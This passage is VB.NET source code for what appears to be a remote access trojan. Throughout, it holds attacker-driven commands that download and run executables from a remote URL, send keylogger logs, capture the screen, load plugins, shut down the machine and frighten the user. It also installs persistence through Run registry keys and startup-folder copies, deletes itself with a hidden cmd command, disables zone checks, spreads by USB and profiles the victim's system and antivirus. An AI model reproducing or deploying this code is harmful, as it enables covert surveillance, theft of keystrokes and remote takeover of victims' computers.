                            Dim iconWidth As Integer = systemIcon.Width
                            Dim iconHeight As Integer = systemIcon.Height

                            Dim iconX As Integer = random.Next(x - iconWidth)
                            Dim iconY As Integer = random.Next(y - iconHeight)

                            Dim graphics As Graphics = Graphics.FromHdc(hdc)
                            graphics.DrawIcon(systemIcon, iconX, iconY)

                            graphics.Dispose()
                        Next

                        ReleaseDC(hwnd, hdc)

                        Exit Select

                    Case "spooky"
                        Randomize()
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim screenBounds As Rectangle = Screen.PrimaryScreen.Bounds
                        Dim faceColor As Color = Color.Yellow
                        Dim eyeColor As Color = Color.Black
                        Dim pupilColor As Color = Color.Red
                        Dim mouthColor As Color = Color.Black
                        Dim faceBrush As New SolidBrush(faceColor)
                        Dim faceWidth As Integer = 100
                        Dim faceHeight As Integer = 100
                        Dim x As Integer = CInt(Math.Floor(Rnd() * (screenBounds.Width - faceWidth)))
                        Dim y As Integer = CInt(Math.Floor(Rnd() * (screenBounds.Height - faceHeight)))
                        Dim faceRect As New Rectangle(x, y, faceWidth, faceHeight)
                        Dim graphics As Graphics = Graphics.FromHdc(hdc)
                        graphics.FillEllipse(faceBrush, faceRect)
                        Dim eyeBrush As New SolidBrush(eyeColor)
                        Dim eyeWidth As Integer = 20
                        Dim eyeHeight As Integer = 20
                        Dim leftEyeX As Integer = x + 10
                        Dim leftEyeY As Integer = y + 20
                        Dim rightEyeX As Integer = x + faceWidth - 30
                        Dim rightEyeY As Integer = y + 20
                        Dim leftEyeRect As New Rectangle(leftEyeX, leftEyeY, eyeWidth, eyeHeight)
                        Dim rightEyeRect As New Rectangle(rightEyeX, rightEyeY, eyeWidth, eyeHeight)
                        graphics.FillEllipse(eyeBrush, leftEyeRect)
                        graphics.FillEllipse(eyeBrush, rightEyeRect)
                        Dim pupilBrush As New SolidBrush(pupilColor)
                        Dim pupilWidth As Integer = 10
                        Dim pupilHeight As Integer = 10
                        Dim leftPupilX As Integer = leftEyeX + 3
                        Dim leftPupilY As Integer = leftEyeY + 5
                        Dim rightPupilX As Integer = rightEyeX + 3
                        Dim rightPupilY As Integer = rightEyeY + 5
                        Dim leftPupilRect As New Rectangle(leftPupilX, leftPupilY, pupilWidth, pupilHeight)
                        Dim rightPupilRect As New Rectangle(rightPupilX, rightPupilY, pupilWidth, pupilHeight)
                        graphics.FillEllipse(pupilBrush, leftPupilRect)
                        graphics.FillEllipse(pupilBrush, rightPupilRect)
                        Dim mouthBrush As New SolidBrush(mouthColor)
                        Dim mouthWidth As Integer = 40
                        Dim mouthHeight As Integer = 20
                        Dim mouthX As Integer = x + 30
                        Dim mouthY As Integer = y + 60
                        Dim mouthPath As New GraphicsPath()
                        mouthPath.AddArc(mouthX, mouthY, mouthWidth, mouthHeight, 180, 180)
                        graphics.FillPath(mouthBrush, mouthPath)
                        faceBrush.Dispose()
                        eyeBrush.Dispose()
                        pupilBrush.Dispose()
                        mouthBrush.Dispose()
                        graphics.Dispose()
                        ReleaseDC(hwnd, hdc)
                        faceBrush.Dispose()
                        eyeBrush.Dispose()
                        pupilBrush.Dispose()
                        mouthBrush.Dispose()
                        graphics.Dispose()
                        ReleaseDC(hwnd, hdc)
                        Exit Select

                    Case "gradient"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height

                        Dim rainbowColors() As Color = {Color.FromArgb(128, Color.Red),
                                Color.FromArgb(128, Color.Orange),
                                Color.FromArgb(128, Color.Yellow),
                                Color.FromArgb(128, Color.Green),
                                Color.FromArgb(128, Color.Blue),
                                Color.FromArgb(128, Color.Indigo),
                                Color.FromArgb(128, Color.Violet)}

                        Dim gradientBrush As New LinearGradientBrush(New Point(0, 0), New Point(x, y), rainbowColors(0), rainbowColors(rainbowColors.Length - 1))
                        Dim blend As New ColorBlend()
                        blend.Colors = rainbowColors

                        Dim positions(rainbowColors.Length - 1) As Single
                        For i As Integer = 0 To rainbowColors.Length - 1
                            positions(i) = CSng(i) / (rainbowColors.Length - 1)
                        Next

                        blend.Positions = positions
                        gradientBrush.InterpolationColors = blend

                        Dim graphics As Graphics = Graphics.FromHdc(hdc)
                        graphics.FillRectangle(gradientBrush, 0, 0, x, y)

                        gradientBrush.Dispose()
                        graphics.Dispose()
                        ReleaseDC(hwnd, hdc)
                        Exit Select

                    Case "newmouse"
                        Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))
                        MouseThread.Start()
                        Exit Select

                    Case "OpenCD"
                        mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)
                        Exit Select

                    Case "CloseCD"
                        mciSendString("set CDAudio door closed", vbNullString, 0, IntPtr.Zero)
                        Exit Select

                    Case "MonitorON"
                        SendMessage(-1, &H112, &HF170, -1)
                        Exit Select

                    Case "MonitorOFF"
                        SendMessage(-1, &H112, &HF170, 2)
                        Exit Select

                    Case "HideTask"
                        Dim hWnd As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
                        ShowWindow(hWnd, SW.Hide)
                        Return

                    Case "ShowTask"
                        Dim hWnd As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
                        ShowWindow(hWnd, SW.ShowNoActivate)
                        Return

                    Case "HideDesk"
                        Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                        ShowWindow(hWnd, SW.Hide)
                        Return

                    Case "ShowDesk"
                        Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                        ShowWindow(hWnd, SW.ShowNoActivate)
                        Return

                    Case "PermisaoFrmTerrror"
                        Send("ChamaFrmTerrorrr")
                        Return

                    Case "EnviarImagemTerrorrr"

                        OK.SCREAM = "off"
                        Try
                            Dim by As Byte() = Nothing
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                            Dim fn As String = Environ("temp") & "\" & RN(10) & A(1)
                            IO.File.WriteAllBytes(fn, by)
                            Dim NoB As New frmSustos
                            NoB.PictureBox1.Image = Image.FromFile(fn)
                            NoB.Show()
                        Catch ex As Exception
                        End Try
                        Return

                    Case "EnviarImagemScreammm"

                        OK.SCREAM = "on"

                        Try
                            Dim by As Byte() = Nothing
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                            Dim fn As String = Environ("temp") & "\" & RN(10) & A(1)
                            IO.File.WriteAllBytes(fn, by)
                            Dim NoB As New frmSustos
                            NoB.PictureBox1.Image = Image.FromFile(fn)
                            NoB.Show()
                        Catch ex As Exception
                        End Try
                        Return

                    Case "SoundUp"
                        Try
                            Dim by As Byte() = Nothing
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                            Dim fn As String = Environ("temp") & "\" & "scream.wav"
                            IO.File.WriteAllBytes(fn, by)

                            OK.Send(("SoundUp"))
                        Catch ex As Exception
                        End Try
                        Return

                    Case "Error"
                        Dim messageBoxButton As MessageBoxButtons = DirectCast(0, MessageBoxButtons)
                        Dim messageBoxIcon As System.Windows.Forms.MessageBoxIcon = DirectCast(0, System.Windows.Forms.MessageBoxIcon)
                        Dim str6 As String = strArray(1)
                        If (Operators.CompareString(str6, "Error", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Asterisk
                        ElseIf (Operators.CompareString(str6, "Question", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Question
                        ElseIf (Operators.CompareString(str6, "Warning", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Exclamation
                        ElseIf (Operators.CompareString(str6, "Info", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Hand
                        End If
                        Dim str7 As String = strArray(2)
                        If (Operators.CompareString(str7, "YesNo", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.YesNo
                        ElseIf (Operators.CompareString(str7, "YesNoCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.YesNoCancel
                        ElseIf (Operators.CompareString(str7, "OK", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.OK
                        ElseIf (Operators.CompareString(str7, "OKCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.OKCancel
                        ElseIf (Operators.CompareString(str7, "RetryCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.RetryCancel
                        ElseIf (Operators.CompareString(str7, "AbortRetryCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.AbortRetryIgnore
                        End If
                        MessageBox.Show(strArray(4), strArray(3), messageBoxButton, messageBoxIcon)
                        Return

                    Case "Speech"
                        Dim Voice = CreateObject("SAPI.spvoice")
                        Voice.speak(String.Concat(New String() {strArray(1)}))
                        Return

                    Case "fun"
                        OK.Send("fun")
                        Return

                    Case "Piano"
                        Beep(String.Concat(New String() {strArray(1)}), "300")
                        Return

                    Case "sht"
                        System.Diagnostics.Process.Start("Shutdown", "/s /t 00")
                        Return

                    Case "rst"
                        System.Diagnostics.Process.Start("Shutdown", "/r /t 00")
                        Return

                    Case "lof"
                        System.Diagnostics.Process.Start("Shutdown", "/l /f")
                        Return

                    Case "botk"
                        BotKillers.RunStandardBotKiller()
                        Return

                    Case "WMM"
                        OK.WINMIN = "on"
                        Return

                    Case "DisWMM"
                        OK.WINMIN = "off"
                        Return

                    Case "SCRM"
                        OK.SCREAM = "on"
                        Return

                    Case "NoSCRM"
                        OK.SCREAM = "off"
                        Return

                    Case "ll"
                        OK.Cn = False
                        Return
                    Case "kl"
                        OK.Send(("kl" & OK.Y & OK.ENB(OK.kq.Logs)))
                        Return
                    Case "prof"
                        Select Case strArray(1)
                            Case "~"
                                OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                                Exit Select
                            Case "!"
                                OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                                OK.Send(Conversions.ToString(Operators.ConcatenateObject((("getvalue" & OK.Y) & strArray(1) & OK.Y), OK.GTV(strArray(1), ""))))
                                Exit Select
                            Case "@"
                                OK.DLV(strArray(2))
                                Exit Select
                        End Select
                        Return
                End Select
                If (str4 <> "rn") Then
                    GoTo Label_0294
                End If
                If (strArray(2).Chars(0) = ChrW(31)) Then
                    Try
                        Dim stream As New MemoryStream
                        Dim length As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                        stream.Write(b, length, (b.Length - length))
                        buffer = OK.ZIP(stream.ToArray)
                        GoTo Label_020B
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        OK.Send(("MSG" & OK.Y & "Execute ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client As New WebClient
                Try
                    buffer = client.DownloadData(strArray(2))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception2 As Exception = exception10
                    OK.Send(("MSG" & OK.Y & "Download ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_020B:
                OK.Send("bla")
                Dim path As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & "." & strArray(1))
                Try
                    File.WriteAllBytes(path, buffer)
                    Process.Start(path)
                    OK.Send(("MSG" & OK.Y & "Executed As " & New FileInfo(path).Name))
                    Return
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception3 As Exception = exception11
                    OK.Send(("MSG" & OK.Y & "Execute ERROR " & exception3.Message))
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_0294:
                Select Case str4
                    Case "inv"
                        Dim t As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                        If ((strArray(3).Length < 10) And (t.Length = 0)) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                        Else
                            If (strArray(3).Length > 10) Then
                                Dim stream2 As New MemoryStream
                                Dim offset As Integer = String.Concat(New String() {strArray(0), OK.Y, strArray(1), OK.Y, strArray(2), OK.Y}).Length
                                stream2.Write(b, offset, (b.Length - offset))
                                t = OK.ZIP(stream2.ToArray)
                                OK.STV(strArray(1), t, RegistryValueKind.Binary)
                            End If
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(t, "A"))
                            NewLateBinding.LateSet(objectValue, Nothing, "h", New Object() {OK.H}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "p", New Object() {OK.P}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "osk", New Object() {strArray(2)}, Nothing, Nothing)
                            NewLateBinding.LateCall(objectValue, Nothing, "start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                            Do While Not Conversions.ToBoolean(Operators.OrObject(Not OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "Off", New Object(0 - 1) {}, Nothing, Nothing, Nothing), True, False)))
                                Thread.Sleep(1)
                            Loop
                            NewLateBinding.LateSet(objectValue, Nothing, "off", New Object() {True}, Nothing, Nothing)
                        End If
                        Return
                    Case "ret"
                        Dim buffer3 As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                        If ((strArray(2).Length < 10) And (buffer3.Length = 0)) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                        Else
                            If (strArray(2).Length > 10) Then
                                Dim stream3 As New MemoryStream
                                Dim num3 As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                                stream3.Write(b, num3, (b.Length - num3))
                                buffer3 = OK.ZIP(stream3.ToArray)
                                OK.STV(strArray(1), buffer3, RegistryValueKind.Binary)
                            End If
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                            Dim instance As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(buffer3, "A"))
                            OK.Send(String.Concat(New String() {"ret", OK.Y, strArray(1), OK.Y, OK.ENB(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "GT", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))}))
                        End If
                        Return
                    Case "CAP"
                        Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
                        Dim image As New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555)
                        Dim g As Graphics = Graphics.FromImage(image)
                        Dim blockRegionSize As New Size(image.Width, image.Height)
                        g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
                        Try
                            blockRegionSize = New Size(&H20, &H20)
                            bounds = New Rectangle(Cursor.Position, blockRegionSize)
                            Cursors.Default.Draw(g, bounds)
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception4 As Exception = exception12
                            ProjectData.ClearProjectError()
                        End Try
                        g.Dispose()
                        Dim bitmap2 As New Bitmap(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
                        g = Graphics.FromImage(bitmap2)
                        g.DrawImage(image, 0, 0, bitmap2.Width, bitmap2.Height)
                        g.Dispose()
                        Dim stream4 As New MemoryStream
                        b = OK.SB(("CAP" & OK.Y))
                        stream4.Write(b, 0, b.Length)
                        Dim stream5 As New MemoryStream
                        bitmap2.Save(stream5, ImageFormat.Jpeg)
                        Dim str2 As String = OK.md5(stream5.ToArray)
                        If (str2 <> OK.lastcap) Then
                            OK.lastcap = str2
                            stream4.Write(stream5.ToArray, 0, CInt(stream5.Length))
                        Else
                            stream4.WriteByte(0)
                        End If
                        OK.Sendb(stream4.ToArray)
                        stream4.Dispose()
                        stream5.Dispose()
                        image.Dispose()
                        bitmap2.Dispose()
                        Return
                    Case "un"
                        Select Case strArray(1)
                            Case "~"
                                OK.UNS()
                                Exit Select
                            Case "!"
                                OK.pr(0)
                                ProjectData.EndApp()
                                Exit Select
                            Case "@"
                                OK.pr(0)
                                Process.Start(OK.LO.FullName)
                                ProjectData.EndApp()
                                Exit Select

                        End Select
                        Return
                End Select




                If (str4 <> "up") Then
                    GoTo Label_0A1C
                End If
                Dim bytes As Byte() = Nothing
                If (strArray(1).Chars(0) = ChrW(31)) Then
                    Try
                        Dim stream6 As New MemoryStream
                        Dim num4 As Integer = (strArray(0) & OK.Y).Length
                        stream6.Write(b, num4, (b.Length - num4))
                        bytes = OK.ZIP(stream6.ToArray)
                        GoTo Label_097B
                    Catch exception13 As Exception
                        ProjectData.SetProjectError(exception13)
                        Dim exception5 As Exception = exception13
                        OK.Send(("MSG" & OK.Y & "Update ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client2 As New WebClient
                Try
                    bytes = client2.DownloadData(strArray(1))
                Catch exception14 As Exception
                    ProjectData.SetProjectError(exception14)
                    Dim exception6 As Exception = exception14
                    OK.Send(("MSG" & OK.Y & "Update ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_097B:
                OK.Send("bla")
                Dim fileName As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & ".exe")
                Try
                    OK.Send(("MSG" & OK.Y & "Updating To " & New FileInfo(fileName).Name))
                    Thread.Sleep(&H7D0)
                    File.WriteAllBytes(fileName, bytes)
                    Process.Start(fileName, "..")
                Catch exception15 As Exception
                    ProjectData.SetProjectError(exception15)
                    Dim exception7 As Exception = exception15
                    OK.Send(("MSG" & OK.Y & "Update ERROR " & exception7.Message))
                    ProjectData.ClearProjectError()
                    Return
                End Try
                OK.UNS()
                Return
Label_0A1C:
                If (str4 = "Ex") Then
                    If (OK.PLG Is Nothing) Then
                        OK.Send("PLG")
                        Dim num5 As Integer = 0
                        Do While Not (((Not OK.PLG Is Nothing) Or (num5 = 20)) Or Not OK.Cn)
                            num5 += 1
                            Thread.Sleep(&H3E8)
                        Loop
                        If ((OK.PLG Is Nothing) Or Not OK.Cn) Then
                            Return
                        End If
                    End If
                    Dim arguments As Object() = New Object() {b}
                    Dim copyBack As Boolean() = New Boolean() {True}
                    NewLateBinding.LateCall(OK.PLG, Nothing, "ind", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        b = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                    End If
                ElseIf (str4 = "PLG") Then
                    Dim stream7 As New MemoryStream
                    Dim num6 As Integer = (strArray(0) & OK.Y).Length
                    stream7.Write(b, num6, (b.Length - num6))
                    OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(stream7.ToArray), "A"))
                    NewLateBinding.LateSet(OK.PLG, Nothing, "H", New Object() {OK.H}, Nothing, Nothing)
                    NewLateBinding.LateSet(OK.PLG, Nothing, "P", New Object() {OK.P}, Nothing, Nothing)
                    NewLateBinding.LateSet(OK.PLG, Nothing, "c", New Object() {OK.C}, Nothing, Nothing)
                End If
            Catch exception16 As Exception
                ProjectData.SetProjectError(exception16)
                Dim exception8 As Exception = exception16
                If ((strArray.Length > 0) AndAlso ((strArray(0) = "Ex") Or (strArray(0) = "PLG"))) Then
                    OK.PLG = Nothing
                End If
                Try
                    OK.Send(String.Concat(New String() {"ER", OK.Y, strArray(0), OK.Y, exception8.Message}))
                Catch exception17 As Exception
                    ProjectData.SetProjectError(exception17)
                    Dim exception9 As Exception = exception17
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Function inf() As String
            Dim str2 As String = ("ll" & OK.Y)
            Try
                If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                    str2 = (str2 & OK.ENB((OK.DEB(OK.VN) & "_" & OK.HWD)) & OK.Y)
                Else
                    str2 = (str2 & OK.ENB((OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & "_" & OK.HWD)) & OK.Y)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str2 = (str2 & OK.ENB(OK.HWD) & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.MachineName & OK.Y)
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception2 As Exception = exception9
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.UserName & OK.Y)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception3 As Exception = exception10
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") & OK.Y)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception4 As Exception = exception11
                str2 = (str2 & "??-??-??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "" & OK.Y)
            Try
                str2 = (str2 & OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
            Catch exception12 As Exception
                ProjectData.SetProjectError(exception12)
                Dim exception5 As Exception = exception12
                str2 = (str2 & "??")
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "SP")
            Try
                Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
                If (strArray.Length = 1) Then
                    str2 = (str2 & "0")
                End If
                str2 = (str2 & strArray((strArray.Length - 1)))
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception6 As Exception = exception13
                str2 = (str2 & "0")
                ProjectData.ClearProjectError()
            End Try
            Try
                If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                    str2 = (str2 & " x64" & OK.Y)
                Else
                    str2 = (str2 & " x86" & OK.Y)
                End If
            Catch exception14 As Exception
                ProjectData.SetProjectError(exception14)
                Dim exception7 As Exception = exception14
                str2 = (str2 & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            If OK.Cam Then
                str2 = (str2 & "Yes" & OK.Y)
            Else
                str2 = (str2 & "No" & OK.Y)
            End If
            str2 = String.Concat(New String() {str2, OK.GetAntiVirus, OK.Y, OK.GetAntiVirus, OK.Y, OK.GetAntiVirus, OK.Y})
            Dim str3 As String = ""
            Try
                Dim str4 As String
                For Each str4 In OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG), RegistryKeyPermissionCheck.Default).GetValueNames
                    If (str4.Length = &H20) Then
                        str3 = (str3 & str4 & ",")
                    End If
                Next
            Catch exception15 As Exception
                ProjectData.SetProjectError(exception15)
                Dim exception8 As Exception = exception15
                ProjectData.ClearProjectError()
            End Try
            Return (str2 & str3)
        End Function

        Public Shared Sub INS()
            Thread.Sleep(&H3E8)

            If (OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo((Interaction.Environ(OK.DR).ToLower & "\" & OK.EXE.ToLower)))) Then
                Try
                    If File.Exists((Interaction.Environ(OK.DR) & "\" & OK.EXE)) Then
                        File.Delete((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    End If
                    Dim stream As New FileStream((Interaction.Environ(OK.DR) & "\" & OK.EXE), FileMode.CreateNew)
                    Dim array As Byte() = File.ReadAllBytes(OK.LO.FullName)
                    stream.Write(array, 0, array.Length)
                    stream.Flush()
                    stream.Close()
                    OK.LO = New FileInfo((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    Process.Start(OK.LO.FullName)

                    If OK.Melty Then
                        Dim piDestruct As ProcessStartInfo = New ProcessStartInfo()

                        piDestruct.Arguments = "/C choice /C Y /N /D Y /T 5 & Del " & """" & Application.ExecutablePath & """"
                        piDestruct.WindowStyle = ProcessWindowStyle.Hidden
                        piDestruct.CreateNoWindow = True
                        piDestruct.FileName = "cmd.exe"

                        Process.Start(piDestruct)
                    Else
                    End If

                    ProjectData.EndApp()
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.EndApp()
                    ProjectData.ClearProjectError()
                End Try
            End If
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try

            If OK.Isu Then
                Try
                    OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception4 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception5 As Exception = exception10
                    ProjectData.ClearProjectError()
                End Try
            End If
            If OK.IsF Then
                Try

                    If File.Exists((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)) Then
                        File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG))
                    End If
                    File.Copy(OK.LO.FullName, (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG), True)
                    ' OK.FS = New FileStream((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG), FileMode.Open)
                    Dim newRG As String = System.IO.Path.GetFileNameWithoutExtension(Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)
                    Dim lnkName As String = newRG
                    If File.Exists((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & lnkName & ".url")) Then
                        File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & lnkName & ".url"))
                    End If

                    'credit to hallaj-hacker 
                    Dim install As String = (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)
                    Dim dest As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    Using writer = New System.IO.StreamWriter(dest & "\" & lnkName & ".url")
                        System.IO.File.SetAttributes(install, System.IO.FileAttributes.Hidden)
                        writer.WriteLine("[InternetShortcut]")
                        writer.WriteLine("URL=file:///" & install)
                        writer.WriteLine("IconIndex=17")
                        writer.WriteLine("IconFile=C:\Windows\system32\SHELL32.dll")
                        writer.Flush()
                    End Using

                    If Conversions.ToBoolean(OK.HIDE_ME) = True Then
                        File.SetAttributes((Application.ExecutablePath), FileAttributes.Hidden)
                        'File.SetAttributes((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG), FileAttributes.Hidden)
                    Else
                    End If
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception6 As Exception = exception11
                    ProjectData.ClearProjectError()
                End Try
            End If



        End Sub


        Public Shared Sub ko()

            Thread.Sleep(CInt(Math.Round(Math.Round(Conversions.ToDouble(OK.SLP) * 1000.0))))

            If OK.Anti_CH = True Then
                Try
                    MyAntiProcess.Start()
                Catch
                End Try
            Else
            End If

            If OK.BOT_KILL = True Then
                Try
                    BotKillers.RunStandardBotKiller()
                    Thread.Sleep(50)
                Catch
                End Try
            Else
            End If

            If OK.USB_SP = True Then
                Try
                    spredusb.Start()
                Catch
                End Try
            End If

            If OK.Persis = True Then
                Try
                    Persistence.Startup()
                Catch
                End Try
            End If



            If (Not Interaction.Command Is Nothing) Then
                Try
                    OK.F.Registry.CurrentUser.SetValue("di", "!")
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
                Thread.Sleep(&H1388)
            End If
            Dim createdNew As Boolean = False
            OK.MT = New Mutex(True, OK.RG, createdNew)
            If Not createdNew Then
                ProjectData.EndApp()
            End If
            OK.INS()
            If Not OK.Idr Then
                OK.EXE = OK.LO.Name
                OK.DR = OK.LO.Directory.Name
            End If
            Dim s As New Thread(New ThreadStart(AddressOf OK.RC), 1)
            s.Start()
            Try
                '' TODO HERE: Option to enable/disable keylogger due to detection by AVs.
                OK.kq = New kl
                Dim m As New Thread(New ThreadStart(AddressOf OK.kq.WRK), 1)
                m.Start()
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception2 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            Dim num As Integer = 0
            Dim str As String = ""
            If OK.BD Then
                Try
                    AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf OK._Lambda__2)
                    OK.pr(1)
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception3 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
            End If
            Do While True
                Thread.Sleep(&H3E8)
                If Not OK.Cn Then
                    str = ""
                End If
                Application.DoEvents()
                Try
                    num += 1
                    If (num = 5) Then
                        Try
                            Process.GetCurrentProcess.MinWorkingSet = (&H400)
                        Catch exception10 As Exception
                            ProjectData.SetProjectError(exception10)
                            Dim exception4 As Exception = exception10
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    If (num >= 8) Then
                        num = 0
                        Dim str2 As String = OK.ACT
                        If (str <> str2) Then
                            str = str2
                            OK.Send(("act" & OK.Y & str2))
                        End If
                    End If
                    If OK.Isu Then
                        Try
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
